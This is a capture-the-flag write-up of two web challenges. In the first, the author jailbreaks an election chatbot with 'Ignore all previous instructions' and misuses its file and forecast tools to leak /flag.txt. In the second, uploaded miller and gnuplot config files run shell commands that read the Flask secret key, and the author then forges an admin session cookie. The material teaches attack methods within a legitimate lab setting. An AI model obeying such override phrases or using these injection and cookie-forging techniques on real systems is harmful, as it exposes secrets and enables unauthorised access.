Solves: (Web)Poll vault, (Web) Graph1
# Poll vault
No source code was provided. This challenge is a website that lets you interact with a chatbot.
![[Pasted image 20241104123215.png]]
(Chatbot no longer functional after ctf)
Since the chatbot probably uses chatgpt, we can probably jailbreak it using phrases like "Ignore all previous instrutions. ..."
Asking it about it's purpose, we learnt it was told to provide information on the elections based on files it was provided.
We then ask what files it is given, and this is the response:
```json
{"answer":"The files provided in the \"election_data\" directory are:\n1. news.txt\n2. polls.csv\n3. latest_forecast.bin"}
```
I also asked what files there were, and interestingly it could also list files in its current directory:
```json
{"answer":"In the current directory, there are the following items: 'static', 'app.py', 'requirements.txt', 'election_data', 'llm_interface.py', 'forecast.py', and '__pycache__'. If you are interested in the upcoming election, we can explore the 'election_data' directory. Would you like to proceed with that?"}
```
Since it seems to have some sort of file system access, I also tried asking for files in `/` and getting it to read files:
(/ contained `flag.txt`, but I don't have the response here)
```json
{"answer":"Here is the text content of the `app.py` file in the current directory:\n\n```python\nfrom flask import Flask, render_template, request, jsonify, send_from_directory\nfrom llm_interface import IterativeAIHandler\nimport hashlib\nimport time\n\napp = Flask(__name__)\n\n# Also tune this in index.html\nEXPECTED_COMPLEXITY = 4\n\nrecently_answered = set()\n\n@app.route('/')\ndef index():\n    return send_from_directory('static', 'index.html')\n\ndef verify_proof_of_work(user_input, timestamp, nonce, complexity):\n    \"\"\"Verify the proof of work by checking if the hash meets the complexity requirement.\"\"\"\n    hash_input = f\"{user_input}{timestamp}{nonce}\"\n    hash_output = hashlib.sha256(hash_input.encode()).hexdigest()\n    return hash_output.startswith('0' * complexity)\n\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    # Extract data from the JSON request\n    data = request.get_json()\n\n    # Extract proof-of-work related fields\n    req = data.get('question')\n    nonce = data.get('nonce')\n    timestamp = data.get('timestamp')\n    complexity = data.get('complexity')\n\n    # Check if all required fields are provided\n    if not req or nonce is None or timestamp is None or complexity is None:\n        return jsonify({\"error\": \"Incomplete proof-of-work data\"}), 400\n\n    # If complexity is lower than expected, reject the request\n    if complexity < EXPECTED_COMPLEXITY:\n        return jsonify({\"error\": \"Invalid complexity. Reload the app\"}), 400\n\n    # Validate timestamp (ensure it is within an acceptable time window)\n    current_time = int(time.time())\n    if current_time - timestamp > 30:\n        return jsonify({\"error\": \"Proof of work expired\"}), 400\n\n    if f\"{nonce}_{timestamp}\" in recently_answered:\n        return jsonify({\"error\": \"Duplicate request\"}), 400\n\n    recently_answered.add(f\"{nonce}_{timestamp}\")\n\n    # Validate proof-of-work\n    if not verify_proof_of_work(req, timestamp, nonce, complexity):\n        return jsonify({\"error\": \"Invalid proof of work\"}), 400\n\n    # All checks passed, proceed with the request\n    try:\n        response = IterativeAIHandler().handle_request(req)\n        return jsonify({\"answer\": response})\n    except Exception as e:\n        return jsonify({\"error\": str(e)}), 500\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080)\n```"}
```
To obtain those files, lots of wrangling of prompts had to be done, to get chatgpt to actually give us the correct file contents. We obtain these files:
`llm_interface.py`
```python
import openai  
import os  
#from dotenv import load_dotenv  
import subprocess  
import json  
  
MODEL="gpt-3.5-turbo-0125"  
MAX_ITERS = 5  
  
# Load environment variables from .env file  
#load_dotenv()  
  
# Set up OpenAI key (you can also use environment variables)  
openai.api_key = os.getenv("OPENAI_API_KEY")  
  
class ToolDispatcher:  
    def __init__(self):  
        # Dynamically collect tool methods on initialization  
        self.tools = {name: func for name, func in self._get_tool_methods()}  
  
    def _get_tool_methods(self):  
        # Dynamically find all methods that start with "tool_" and register them  
        for attr_name in dir(self):  
            if attr_name.startswith("tool_"):  
                method = getattr(self, attr_name)  
                yield attr_name[5:], method  # Remove "tool_" prefix for clarity in dispatching  
  
    def get_registered_functions(self):  
        # Create a list of function descriptions for each registered tool  
        functions_list = []  
        for name, method in self.tools.items():  
            # Check for the method signature dynamically  
            # We'll assume arguments of the method are documented in __doc__            docstring = method.__doc__.strip() if method.__doc__ else "No description provided."  
            functions_list.append({  
                "name": name,  
                "description": docstring,  
                "parameters": {  
                    "type": "object",  
                    "properties": {  
                        param: {  
                            "type": "string",  
                            "description": f"{param} parameter"                        } for param in self._get_method_params(method)  
                    },  
                    "required": self._get_method_params(method)  
                }            })  
        return functions_list  
  
    def _get_method_params(self, method):  
        # Extract method parameters dynamically (generic for any method signature)  
        from inspect import signature  
        sig = signature(method)  
        return [param.name for param in sig.parameters.values() if param.name != 'self']  
  
    def dispatch_tool(self, function_name, arguments):  
        # Dynamically call the appropriate method based on function name  
        if function_name in self.tools:  
            return self.tools[function_name](**arguments)  
        else:  
            raise ValueError(f"Function {function_name} not found.")  
  
    def tool_list_directory(self, dir_path):  
        """  
        Get a list of filenames and directories contained within dir_path.        """  
        # Prepend with the current directory        dir_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), dir_path)  
  
        try:  
            if os.path.isdir(dir_path):  
                #return os.listdir(dir_path)  
                # Return a list of paths relative to the directory                return [os.path.relpath(os.path.join(dir_path, f), os.path.dirname(os.path.abspath(__file__))) for f in os.listdir(dir_path)]  
            else:  
                return f"Error: The directory {dir_path} does not exist."        except Exception as e:  
            return f"Error listing directory {dir_path}: {e}"  
  
    def tool_read_file(self, file_path):  
        """  
        Read the content of a file specified by file_path.        """        # Prefix with current directory and ensure it doesn't escape        file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), file_path)  
  
        if not os.path.abspath(file_path).startswith(os.path.dirname(os.path.abspath(__file__))):  
            return "Error: You cannot read files outside of the current directory."  
  
        if os.path.isfile(file_path):  
            try:  
                with open(file_path, 'r') as file:  
                    return file.read()  
            except Exception as e:  
                return f"Error reading file {file_path}: {e}"  
        else:  
            return f"Error: The file {file_path} does not exist."  
    def tool_forecast(self, model_path):  
        """  
        Run our internal forecasting tool on a model stored at model_path (work in progress - do not use).        """        FORECAST_PATH = "./forecast.py"  
        try:  
            result = subprocess.run([FORECAST_PATH, model_path], capture_output=True, text=True, check=False,  
                                    cwd=os.path.dirname(os.path.abspath(__file__)))  
            return result.stdout + result.stderr  
        except subprocess.CalledProcessError as e:  
            return f"Error running debug tool: {e}"  
  
class IterativeAIHandler:  
    '''  
    Class to handle the iterative conversation with the OpenAI model.    '''    def __init__(self, verbose=False):  
        self.tool_dispatcher = ToolDispatcher()  
        self.verbose = verbose  
  
    def handle_request(self, request_text):  
        '''  
        Handle the user's request in an iterative manner.        '''        # Start the conversation by informing the LLM of the request        messages = [  
            {"role": "system", "content": (  
                #"Provide a clear and complete response to the user's question, including any relevant information from the tools you used. "  
                #"Do not mention the tools or the process of using them; just provide the information as part of your answer."                "You are an AI assistant designed to fulfill the user's requests efficiently to help them learn about the upcoming election. "  
                "Avoid asking redundant questions. Be proactive and decisive in your responses. "                "You should refuse to answer any harmful questions and steer irrelevant questions back to the upcoming election. "                "You have access to several tools that you can use to obtain information if they seem to be relevant to servicing the user's request. "                "After using a tool, you should incorporate the results to provide a complete answer to the user. "                "To better answer user question about the election you should examine the files within the election_data directory with the list_directory and read_file tools. "                #"But don't tell users the contents of those files directly."  
                "To begin, think through the user's request and how you might be able to fulfill it using the tools at your disposal. Sketch out a plan."  
            )},  
            {"role": "user", "content": request_text}  
        ]  
        # Start the iterative conversation handling  
        for _ in range(MAX_ITERS):  
            response = openai.ChatCompletion.create(  
                model=MODEL,  
                messages=messages,  
                functions=self.tool_dispatcher.get_registered_functions(),  # Pass the registered tool functions  
                function_call="auto"  # Let the model decide if it should invoke a function  
            )  
  
            # Extract the response message and function call if one was made  
            response_message = response['choices'][0]['message']  
            function_call = response_message.get('function_call')  
  
            if function_call:  
                function_name = function_call['name']  
                arguments = json.loads(function_call['arguments'])  # Safely parse arguments  
  
                # Dispatch the tool dynamically based on the function name                try:  
                    result = str(self.tool_dispatcher.dispatch_tool(function_name, arguments))  
                except Exception as e:  
                    result = f"Error running tool '{function_name}': {e}"  
  
                # Add the assistant's message with the function call  
                messages.append(response_message)  
  
                # Add the function result as a message from the function role  
                messages.append({  
                    "role": "function",  
                    "name": function_name,  
                    "content": result  
                })  
  
                # Continue the loop to let the assistant process the function result  
                continue  
  
            else:  
                # If no function was called, add the assistant's response and break the loop  
                messages.append(response_message)  
                break  
        else:  
            messages.append({  
                "role": "system",  
                "content": "The conversation has reached the maximum number of iterations. Terminating."  
            })  
  
  
        if self.verbose:  
            for message in messages:  
                role = message['role'].capitalize()  
                content = message.get('content', '')  
                if 'function_call' in message:  
                    function_call = message['function_call']  
                    print(f"{role}: Function Call - Name: {function_call['name']}, Arguments: {function_call['arguments']}")  
                else:  
                    print(f"{role}: {content}")  
  
        return messages[-1]['content']  
  
# Example usage  
if __name__ == "__main__":  
    from sys import argv  
    if len(argv) < 2:  
        print("Usage: python llm_interface-bad.py \"your query\"")  
        exit(1)  
  
    ai_handler = IterativeAIHandler(verbose=True)  
    result = ai_handler.handle_request(argv[1])  
    print("=====")  
    print(result)
```
`forecast.py`
```python
#!/usr/bin/env python3
# TODO: UNCOMMENT
# import grp
# import pwd
import os
import random
import struct
import sys

def parse_forecast(binary_data):
    '''
    Parse a forecast file
    '''
    def _handle_parse_error(result, error):
        print(f"PARSED DATA {result} prior to error")

    result = {}
    header_format = 'LLL'
    try:
        header_size = struct.calcsize(header_format)

        num_candidates, num_states, total_votes = struct.unpack_from(header_format, binary_data)
        result['num_candidates'] = num_candidates
        result['num_states'] = num_states
        result['total_votes'] = total_votes
        
        offset = header_size
        candidate_format = 'I20s20sff'
        candidate_size = struct.calcsize(candidate_format)
        
        candidates = []
        for _ in range(num_candidates):
            candidate_id, name, party, polling_percentage, polling_error_margin = struct.unpack_from(candidate_format, binary_data, offset)
            name = name.decode('utf-8').strip('\\x00')
            party = party.decode('utf-8').strip('\\x00')
            candidates.append((candidate_id, name, party, polling_percentage, polling_error_margin))
            offset += candidate_size
        result['candidates'] = candidates
        
        states = []
        state_format = 'III'
        state_size = struct.calcsize(state_format)
        
        for _ in range(num_states):
            state_id, electoral_votes, population = struct.unpack_from(state_format, binary_data, offset)
            offset += state_size
            votes_per_candidate = []
            for _ in range(num_candidates):
                votes = struct.unpack_from('I', binary_data, offset)[0]
                votes_per_candidate.append(votes)
                offset += 4
            states.append((state_id, electoral_votes, population, votes_per_candidate))
        result['states'] = states
        
        return result

    except Exception as e:
        # If we fail to parse our input, log what we have for debugging
        _handle_parse_error(result, e)

def run_forecast_simulation(parsed_data, num_simulations=1000):
    '''
    Run a forecast with the given data up to num_simulations times
    '''
    candidates = parsed_data['candidates']
    states = parsed_data['states']
    
    electoral_college_threshold = 270
    candidate_wins = {candidate[1]: 0 for candidate in candidates}  # Track wins per candidate
    
    for _ in range(num_simulations):
        electoral_votes = {candidate[1]: 0 for candidate in candidates}
        
        for state in states:
            state_id, electoral_votes_state, population, votes_per_candidate = state
            
            candidate_results = []
            for i, candidate in enumerate(candidates):
                candidate_id, name, party, polling_percentage, polling_error_margin = candidate
                adjusted_polling_percentage = random.gauss(polling_percentage, polling_error_margin)
                adjusted_polling_percentage = max(0, min(100, adjusted_polling_percentage))
                
                candidate_results.append((name, adjusted_polling_percentage))
            
            winner = max(candidate_results, key=lambda x: x[1])[0]
            electoral_votes[winner] += electoral_votes_state
        
        winner = max(electoral_votes, key=electoral_votes.get)
        candidate_wins[winner] += 1
    
    forecast_results = {candidate: (wins / num_simulations) * 100 for candidate, wins in candidate_wins.items()}
    likely_winner = max(forecast_results, key=forecast_results.get)
    
    return {
        'candidate_win_probabilities': forecast_results,
        'likely_winner': likely_winner
    }

def drop_privileges(uid_name='nobody', gid_name='nogroup'):
    '''
    Security best practice: drop privileges as soon as possible
    '''
    try:
        # Get the uid/gid from the name using the pwd and grp modules
        target_uid = pwd.getpwnam(uid_name).pw_uid
        target_gid = grp.getgrnam(gid_name).gr_gid

        # Set the new group
        os.setgid(target_gid)

        # Remove group privileges
        os.setgroups([])

        # Set the new user
        os.setuid(target_uid)

        # Verify we can no longer escalate back to root
        os.seteuid(target_uid)
    except Exception as e:
        print(f"Failed to drop privileges: {str(e)}")
        sys.exit(1)

def do_forecast():
    from sys import argv
    with open(argv[1], 'rb') as f:
        parsed_forecast = parse_forecast(f.read())

    if parsed_forecast is not None:
        # Run the forecast
        forecast_result = run_forecast_simulation(parsed_forecast, num_simulations=1000)

        # Display forecast results
        print("Forecast Results:")
        print(f"Candidate Win Probabilities: {forecast_result['candidate_win_probabilities']}")
        print(f"Likely Winner: {forecast_result['likely_winner']}")

if __name__ == "__main__":
    # drop_privileges()
    # do_forecast()
    # ABOVE CODE IS THE ACTUAL CODE
    with open("flag.txt", 'rb') as f:
        parse_forecast(f.read())
```
As seen from `llm_interface.py`, `tool_read_file`, `tool_forecast` and `tool_list_directory` is how the chatbot was able to provide the information we got earlier. Now, our goal is to get `/flag.txt`. Unfortunately, `tool_read_file` does not allow files in `/` to be read, so we can't extract the flag that way. However, there is also `tool_forecast`. We are certain the tool will be able to read at least 24 bytes of headers of any files, even if the file isn't in the right format. 
```python
def parse_forecast(binary_data):
	...
    result = {}
    header_format = 'LLL'
    try:
        header_size = struct.calcsize(header_format)
        num_candidates, num_states, total_votes = struct.unpack_from(header_format, binary_data)
        result['num_candidates'] = num_candidates
        result['num_states'] = num_states
        result['total_votes'] = total_votes
	...
	except Exception as e:
        # If we fail to parse our input, log what we have for debugging
        _handle_parse_error(result, e)
```
Its exception handler will also print all captured data prior to the error, hence allowing us to smuggle the first 24 bytes of a file. 
```python
    def _handle_parse_error(result, error):
        print(f"PARSED DATA {result} prior to error")
```
Now, we ask the chatbot to run the forecast on `/flag.txt`, specifying that it has to include the exact error message(It'd simply say something went wrong otherwise). Those numbers can then be converted back to utf-8, giving us our flag
```python
long_numbers = [7944425039487659110 , 7232626473741477223 , 9035755089488344128]
byte_array = bytearray()
for number in long_numbers:
    byte_array.extend(number.to_bytes(8, byteorder='little'))
utf8_string = byte_array.decode('utf-8')
print(utf8_string)
```
`flag{D@nger0us_d@tabase}`
# graph 1
We have a website where we can upload csv files and download graphs made from the csvs we upload.
![[Pasted image 20241104132737.png]]
![[Pasted image 20241104132759.png]]
For this challenge, our goal seems to be getting the admin account and downloading it's files
```python
@app.route('/signin')  
def signin():  
    if "user" not in session:  
        # TODO Perhaps this is our goal, to read the files of the admin  
        if sha512(request.args.get('admin', '').encode()) == environ['ADMINHASH']:  
            session[  
                "user"  
            ] = '872bfdd01752ea2641a3e211db6127a7af1d9b44f1602780bbae465ccf4ac25e'  
        else:  
            session["user"] = token_hex()  
        Path(app.config['DATA_DIR'], session["user"]).mkdir(parents=True, exist_ok=True)  
    return redirect(url_for("index"))
```
Reviewing the source code, we see the tools miller and gnuplot are used for conversion and graphing respectively
```python
def gnuplot(in_filename, out_filename, points):  
	plot = f"""  
set terminal png size 2048,512  
set output '{out_filename}'  
set nokey  
plot '{in_filename}' with {points}  
"""  
    p = Popen(['sandbox.sh', 'gnuplot'], text=True, stdin=PIPE, stderr=PIPE)  
    output = p.communicate(input=plot)[1:]  
    return p.returncode, output
...
def convert(filename, contents):  
    for line in contents.rstrip('\n').split('\n'):  
        if ',' not in line or ' ' in line:  
            return False  
    with open(filename, 'w') as f:  
        f.write(contents)  
    out = run(  
        ['sandbox.sh', 'mlr', '--icsvlite', '--opprint', '-N', 'cat', filename],  
        capture_output=True,  
    ).stdout  
    with open(filename, 'wb') as f:  
        f.write(out)  
    return True
```
The above miller script takes in a csv file and prints it nicely in a table like format, spacing the entries apart neatly.
Hijacking the command is not possible here despite the file names being directly substituted in as all filenames are validated ensuring only alphabets,  `-_` and at most one `.` is allowed.
```python
def isfilename(s: str) -> bool:  
	return s and all(  
        c in string.ascii_uppercase + string.ascii_lowercase + string.digits + '_-'  
        for c in ''.join(s.split('.', 1)) # Basically removes the first period
    )
```
We also can't specify flags for the commands, as spaces are also disallowed.
Looking deeper into miller and gnuplot, we see that miller has its own scripting language(), which we could use to obtain environment variables. Gnuplot itself seems to be a script engine, meaning we could also use it to run commands. 
However, all those capabilities would be useless without a way to execute scripts. When searching for CVEs related to miller and gnuplot, I found this exploit for an old version of miller:
https://github.com/johnkerl/miller/security/advisories/GHSA-mw2v-4q78-j2cw
The exploit abuses the `--prepipe` flag, which pipes data into a command to allow it to be preprocessed. As `.millerrc` is a valid file name, we could upload the config file and get it to run any commands.
```python
with open("payload", 'r') as f:  
    files = {"csv": (".millerrc", f, "text/csv")}  
    url = "http://graph.chal.hackthe.vote/data"  
    cookies = {"session": "..."}  
    res = requests.post(url, files=files, cookies=cookies, allow_redirects=False)
```
I tried this POC to see if the miller version used was vulnerable:
`prepipe,touch,maybe.csv;cat` 
Since spaces are not allowed in csv files(as from the above `convert` function), we use commas instead, which get replaced with spaces when the file is pretty printed. When the next csv file is uploaded, the config file should be loaded and the script should run.
Unfortunately, nothing appeared, meaning the miller used here was not vulnerable anymore.
What about gnuplot? If miller had its own config file, maybe gnuplot has one too?
Lo and behold, I found this https://stackoverflow.com/questions/1200463/is-there-a-gnuplot-configuration-file. It states
> "If the initialization file is found, gnuplot executes the commands in it. These may be any legal gnuplot commands, but typically they are limited to setting the terminal and defining frequently-used functions or variables."

By uploading a  `.gnuplot` config file, we could run commands such as
```
projName=,system("echo,$SECRET_KEY")  
set,title,projName
```
which gets converted into
```
secret= system("echo $SECRET_KEY")  
set       title        secret
```
after being processed by miller. Now, when graphing an image, we also obtain the flask secret key.
(TODO Image here once the server is fixed)
From there, we can forge our flask session cookie with the admin user
```python
print(FSCM.encode("_5#y2LxF4Q8zxnxxec]/", '{"user": "872bfdd01752ea2641a3e211db6127a7af1d9b44f1602780bbae465ccf4ac25e"}'))
```
> Notes: Solutions have directly used miller config files with the `--from` flag to obtain flag1.csv from the admin user directory, however I did not try that as I was unsure what the sandbox limited me to.

From there, we can download `flag1.csv` and get it plotted, showing this monstrosity
![[Pasted image 20241104142726.png]]
Here, I could probably have used other graphing options but I just threw it into the site's grapher, hence making the letters incredibly hard to make out. 20 minutes of paint later, I was able to guess the flag
![[Pasted image 20241104143008.png]]
`flag{contrived_scenario}`
> Not shown: Hours of looking through miller and gnupot docs, checking stuff like special filenames for gnuplot and the miller and gnuplot DSL